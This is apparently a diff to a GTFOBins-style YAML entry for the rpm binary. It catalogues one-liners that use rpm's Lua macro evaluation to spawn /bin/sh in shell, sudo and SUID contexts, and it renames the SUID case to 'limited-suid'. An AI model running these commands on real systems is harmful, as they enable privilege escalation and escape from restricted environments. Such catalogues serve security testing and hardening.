@@ -2,8 +2,8 @@
 functions:
   shell:
     - code: rpm --eval '%{lua:os.execute("/bin/sh")}'
-  suid:
-    - code: ./rpm --eval '%{lua:os.execute("/bin/sh", "-p")}'
+  limited-suid:
+    - code: ./rpm --eval '%{lua:os.execute("/bin/sh")}'
   sudo:
     - code: sudo rpm --eval '%{lua:os.execute("/bin/sh")}'
     - description: |
